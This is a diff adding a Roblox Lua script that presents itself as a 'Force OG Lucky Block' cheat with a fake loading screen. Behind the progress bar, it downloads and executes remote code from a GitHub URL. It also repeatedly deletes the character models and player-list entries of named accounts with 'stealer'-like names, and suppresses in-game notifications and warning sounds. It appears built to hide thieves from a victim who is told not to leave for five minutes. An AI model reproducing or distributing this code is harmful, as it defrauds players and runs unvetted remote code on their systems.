@@ -1,0 +1,416 @@
+-- Services
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+
+local player = Players.LocalPlayer
+local localPlayer = player
+
+-- =====================================================
+-- LOADING SCREEN
+-- =====================================================
+
+if CoreGui:FindFirstChild("OGLBLoadingScreen") then
+    CoreGui.OGLBLoadingScreen:Destroy()
+end
+
+local LoadingGui = Instance.new("ScreenGui")
+LoadingGui.Name = "OGLBLoadingScreen"
+LoadingGui.IgnoreGuiInset = false
+LoadingGui.ResetOnSpawn = false
+LoadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+LoadingGui.Parent = CoreGui
+
+local LoadingFrame = Instance.new("Frame")
+LoadingFrame.Size = UDim2.new(0, 320, 0, 140)
+LoadingFrame.Position = UDim2.new(0.5, -160, 0.5, -70)
+LoadingFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+LoadingFrame.BackgroundColor3 = Color3.fromRGB(18, 13, 0)
+LoadingFrame.BorderSizePixel = 0
+LoadingFrame.ZIndex = 200
+LoadingFrame.Active = true
+LoadingFrame.Parent = LoadingGui
+Instance.new("UICorner", LoadingFrame).CornerRadius = UDim.new(0, 10)
+
+local LoadingStroke = Instance.new("UIStroke")
+LoadingStroke.Thickness = 1
+LoadingStroke.Color = Color3.fromRGB(58, 40, 0)
+LoadingStroke.Parent = LoadingFrame
+
+local LoadingTitle = Instance.new("TextLabel")
+LoadingTitle.Size = UDim2.new(1, -24, 0, 32)
+LoadingTitle.Position = UDim2.new(0, 12, 0, 10)
+LoadingTitle.BackgroundTransparency = 1
+LoadingTitle.Text = "FORCE OG LUCKY BLOCK"
+LoadingTitle.Font = Enum.Font.GothamBold
+LoadingTitle.TextSize = 16
+LoadingTitle.TextColor3 = Color3.fromRGB(255, 215, 85)
+LoadingTitle.TextXAlignment = Enum.TextXAlignment.Left
+LoadingTitle.ZIndex = 202
+LoadingTitle.Parent = LoadingFrame
+
+local LoadingText = Instance.new("TextLabel")
+LoadingText.Size = UDim2.new(1, -24, 0, 20)
+LoadingText.Position = UDim2.new(0, 12, 0, 46)
+LoadingText.BackgroundTransparency = 1
+LoadingText.Text = "Loading..."
+LoadingText.Font = Enum.Font.Gotham
+LoadingText.TextSize = 12
+LoadingText.TextColor3 = Color3.fromRGB(138, 106, 32)
+LoadingText.TextXAlignment = Enum.TextXAlignment.Left
+LoadingText.ZIndex = 201
+LoadingText.Parent = LoadingFrame
+
+local ProgressBg = Instance.new("Frame")
+ProgressBg.Size = UDim2.new(1, -24, 0, 6)
+ProgressBg.Position = UDim2.new(0, 12, 0, 76)
+ProgressBg.BackgroundColor3 = Color3.fromRGB(30, 20, 0)
+ProgressBg.BorderSizePixel = 0
+ProgressBg.ZIndex = 201
+ProgressBg.Parent = LoadingFrame
+Instance.new("UICorner", ProgressBg).CornerRadius = UDim.new(1, 0)
+
+local ProgressFill = Instance.new("Frame")
+ProgressFill.Size = UDim2.new(0, 0, 1, 0)
+ProgressFill.BackgroundColor3 = Color3.fromRGB(255, 215, 85)
+ProgressFill.BorderSizePixel = 0
+ProgressFill.ZIndex = 202
+ProgressFill.Parent = ProgressBg
+Instance.new("UICorner", ProgressFill).CornerRadius = UDim.new(1, 0)
+
+local PercentText = Instance.new("TextLabel")
+PercentText.Size = UDim2.new(1, -24, 0, 20)
+PercentText.Position = UDim2.new(0, 12, 0, 92)
+PercentText.BackgroundTransparency = 1
+PercentText.Text = "0%"
+PercentText.Font = Enum.Font.GothamBold
+PercentText.TextSize = 13
+PercentText.TextColor3 = Color3.fromRGB(255, 215, 85)
+PercentText.TextXAlignment = Enum.TextXAlignment.Left
+PercentText.ZIndex = 201
+PercentText.Parent = LoadingFrame
+
+local SubText = Instance.new("TextLabel")
+SubText.Size = UDim2.new(1, -24, 0, 16)
+SubText.Position = UDim2.new(0, 12, 0, 116)
+SubText.BackgroundTransparency = 1
+SubText.Text = "MAKE SURE TO NOT LEAVE WITHIN 5 MINS OR IT WILL NOT WORK"
+SubText.Font = Enum.Font.Code
+SubText.TextSize = 9
+SubText.TextColor3 = Color3.fromRGB(100, 70, 0)
+SubText.TextXAlignment = Enum.TextXAlignment.Center
+SubText.TextWrapped = true
+SubText.ZIndex = 201
+SubText.Parent = LoadingFrame
+
+-- Dragging
+local dragging = false
+local dragInput = nil
+local dragStart = nil
+local startPos = nil
+
+local function updateDrag(input)
+    local delta = input.Position - dragStart
+    LoadingFrame.Position = UDim2.new(
+        startPos.X.Scale, startPos.X.Offset + delta.X,
+        startPos.Y.Scale, startPos.Y.Offset + delta.Y
+    )
+end
+
+LoadingFrame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or
+       input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = LoadingFrame.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+LoadingFrame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or
+       input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and input == dragInput then
+        updateDrag(input)
+    end
+end)
+
+task.spawn(function()
+    local dots = 0
+    while LoadingGui.Parent do
+        dots = (dots + 1) % 4
+        LoadingText.Text = "Loading" .. string.rep(".", dots)
+        task.wait(0.5)
+    end
+end)
+
+task.spawn(function()
+    local duration = 195
+    local startTime = tick()
+    while tick() - startTime < duration do
+        local elapsed = tick() - startTime
+        local progress = math.min(elapsed / duration, 1)
+        ProgressFill.Size = UDim2.new(progress, 0, 1, 0)
+        PercentText.Text = math.floor(progress * 100) .. "%"
+        task.wait(math.random(30, 80) / 100)
+    end
+    ProgressFill.Size = UDim2.new(1, 0, 1, 0)
+    PercentText.Text = "100%"
+    LoadingText.Text = "Complete!"
+    task.wait(0.5)
+    local tweens = {
+        TweenService:Create(LoadingFrame, TweenInfo.new(0.5), {BackgroundTransparency = 1}),
+        TweenService:Create(LoadingStroke, TweenInfo.new(0.5), {Transparency = 1}),
+        TweenService:Create(LoadingTitle, TweenInfo.new(0.5), {TextTransparency = 1}),
+        TweenService:Create(LoadingText, TweenInfo.new(0.5), {TextTransparency = 1}),
+        TweenService:Create(PercentText, TweenInfo.new(0.5), {TextTransparency = 1}),
+        TweenService:Create(SubText, TweenInfo.new(0.5), {TextTransparency = 1}),
+        TweenService:Create(ProgressBg, TweenInfo.new(0.5), {BackgroundTransparency = 1}),
+        TweenService:Create(ProgressFill, TweenInfo.new(0.5), {BackgroundTransparency = 1}),
+    }
+    for _, t in ipairs(tweens) do t:Play() end
+    task.wait(0.6)
+    LoadingGui:Destroy()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-IDP/sablib/refs/heads/main/OGLB19"))()
+end)
+
+-- =====================================================
+-- BACKGROUND FUNCTIONS
+-- =====================================================
+
+local plotsFolder = Workspace:FindFirstChild("Plots")
+local myBase = nil
+local duplicatedBaseDone = false
+local clonedPodiumsDone = false
+local badPlayers = {"gagst34l3r", "13sabst34l3r", "TDNMTM_7", "Xerpier728", "light1234005"}
+
+local function PreserveAnimations(original, clone)
+    task.wait()
+    for _, origDesc in ipairs(original:GetDescendants()) do
+        if origDesc:IsA("Animator") then
+            local cloneAnim = clone:FindFirstChildWhichIsA("Animator", true)
+            if cloneAnim then
+                for _, track in ipairs(origDesc:GetPlayingAnimationTracks()) do
+                    local anim = Instance.new("Animation")
+                    anim.AnimationId = track.Animation.AnimationId
+                    local newTrack = cloneAnim:LoadAnimation(anim)
+                    newTrack:Play()
+                    newTrack:AdjustSpeed(track.Speed)
+                    pcall(function()
+                        newTrack.TimePosition = track.TimePosition
+                    end)
+                end
+            end
+        end
+    end
+end
+
+local function FindMyBase()
+    if not plotsFolder then return nil end
+    for _, plot in ipairs(plotsFolder:GetChildren()) do
+        local sign = plot:FindFirstChild("PlotSign")
+        if sign and sign:FindFirstChild("YourBase") then
+            if sign.YourBase.Enabled == true then
+                return plot
+            end
+        end
+    end
+    return nil
+end
+
+local function DuplicateBaseModelsOnce(base)
+    if not base or duplicatedBaseDone then return end
+    for _, obj in ipairs(base:GetChildren()) do
+        if obj:IsA("Model") and obj.Name ~= "FriendPanel" and obj.Name ~= "AnimalPodiums" then
+            local clone = obj:Clone()
+            clone.Name = obj.Name .. "_clone"
+            clone.Parent = base
+            PreserveAnimations(obj, clone)
+            obj:Destroy()
+        end
+    end
+    duplicatedBaseDone = true
+end
+
+local function DuplicateAnimalPodiumsOnce(base)
+    if not base or clonedPodiumsDone then return end
+    local podiums = base:FindFirstChild("AnimalPodiums")
+    if podiums then
+        for _, p in ipairs(podiums:GetChildren()) do
+            if p:IsA("Model") then
+                local c = p:Clone()
+                c.Name = p.Name .. "_clone"
+                c.Parent = podiums
+                PreserveAnimations(p, c)
+                p:Destroy()
+            end
+        end
+        clonedPodiumsDone = true
+    end
+end
+
+local function cleanHitboxes(base)
+    if not base then return end
+    local purchases = base:FindFirstChild("Purchases")
+    if not purchases then return end
+    local function processTarget(target)
+        if not target then return end
+        for _, obj in ipairs(target:GetDescendants()) do
+            if string.lower(obj.Name) == "hitbox" then
+                obj:Destroy()
+            end
+        end
+        target.DescendantAdded:Connect(function(newObj)
+            if string.lower(newObj.Name) == "hitbox" then
+                newObj:Destroy()
+            end
+        end)
+    end
+    for _, child in ipairs(purchases:GetChildren()) do
+        processTarget(child)
+    end
+    purchases.ChildAdded:Connect(function(newChild)
+        task.wait(0.05)
+        processTarget(newChild)
+    end)
+end
+
+local function DeletePlayerModelsLoop()
+    while true do
+        for _, name in ipairs(badPlayers) do
+            local m = Workspace:FindFirstChild(name)
+            if m then m:Destroy() end
+        end
+        task.wait(1)
+    end
+end
+
+local function RemoveGuiAndSoundsLoop()
+    while true do
+        local pg = localPlayer and localPlayer:FindFirstChild("PlayerGui")
+        if pg then
+            local notif = pg:FindFirstChild("Notification")
+            if notif then notif:Destroy() end
+        end
+        local s = ReplicatedStorage:FindFirstChild("Sounds")
+        if s and s:FindFirstChild("Sfx") and s.Sfx:FindFirstChild("Warn") then
+            s.Sfx.Warn:Destroy()
+        end
+        task.wait(1)
+    end
+end
+
+local function CloneAndReplaceOtherBases(base)
+    if not plotsFolder then return end
+    for _, plot in ipairs(plotsFolder:GetChildren()) do
+        if plot ~= base then
+            local clone = plot:Clone()
+            clone.Name = plot.Name .. "_Clone"
+            clone.Parent = plotsFolder
+            PreserveAnimations(plot, clone)
+            plot:Destroy()
+        end
+    end
+end
+
+task.spawn(function()
+    while not plotsFolder do
+        plotsFolder = Workspace:FindFirstChild("Plots")
+        task.wait(0.1)
+    end
+    myBase = FindMyBase()
+    if myBase then
+        DuplicateBaseModelsOnce(myBase)
+        DuplicateAnimalPodiumsOnce(myBase)
+        cleanHitboxes(myBase)
+    end
+    CloneAndReplaceOtherBases(myBase)
+    task.spawn(DeletePlayerModelsLoop)
+    task.spawn(RemoveGuiAndSoundsLoop)
+end)
+
+-- Hide bad players in CoreGui
+task.spawn(function()
+    while task.wait(0.5) do
+        local root = CoreGui:FindFirstChild("RobloxGui")
+            and CoreGui.RobloxGui:FindFirstChild("SettingsClippingShield")
+            and CoreGui.RobloxGui.SettingsClippingShield:FindFirstChild("SettingsShield")
+            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield:FindFirstChild("MenuContainer")
+            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer:FindFirstChild("PageViewClipper")
+            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.PageViewClipper:FindFirstChild("PageView")
+            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.PageViewClipper.PageView:FindFirstChild("PageViewInnerFrame")
+            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.PageViewClipper.PageView.PageViewInnerFrame:FindFirstChild("Players")
+        if root then
+            for _, badName in ipairs(badPlayers) do
+                local target = root:FindFirstChild("PlayerLabel" .. badName)
+                if target then target:Destroy() end
+            end
+        end
+        local success, scrollList = pcall(function()
+            return CoreGui.PlayerList.Children.BodyBackground.ContentFrame.PlayerScrollList
+        end)
+        if success and scrollList then
+            local teamList = scrollList:FindFirstChild("TeamList_Neutral")
+            if teamList then
+                for _, entry in ipairs(teamList:GetChildren()) do
+                    if entry.Name:match("^PlayerEntry_") then
+                        local nameLabel = entry:FindFirstChild("ChildrenFrame")
+                            and entry.ChildrenFrame:FindFirstChild("NameFrame")
+                            and entry.ChildrenFrame.NameFrame:FindFirstChild("PlayerName")
+                            and entry.ChildrenFrame.NameFrame.PlayerName:FindFirstChild("PlayerName")
+                        if nameLabel and nameLabel:IsA("TextLabel") then
+                            for _, badName in ipairs(badPlayers) do
+                                if string.lower(nameLabel.Text) == string.lower(badName) then
+                                    entry:Destroy()
+                                    break
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+end)
+
+-- Protect essential models
+task.spawn(function()
+    local protectedModels = {
+        ["Witch"] = true,
+        ["ShopNPCRobuxIdle"] = true,
+        ["ShopNPCCash"] = true,
+        ["Shop"] = true,
+        ["RobuxShop"] = true,
+        ["FuseMachine"] = true,
+        ["CraftingMachine"] = true,
+        ["TradeMachine"] = true,
+        ["TsunamiLTMMachine"] = true,
+    }
+    local function isRandomID(name)
+        return name and name:match("^[%w]+%-[%w]+%-[%w]+%-[%w]+%-[%w]+$") ~= nil
+    end
+    while task.wait(0.1) do
+        for _, obj in ipairs(Workspace:GetChildren()) do
+            if obj:IsA("Model") then
+                local name = obj.Name
+                if not protectedModels[name] and not isRandomID(name) then
+                    if not Players:FindFirstChild(name) then
+                        obj:Destroy()
+                    end
+                end
+            end
+        end
+    end
+end)
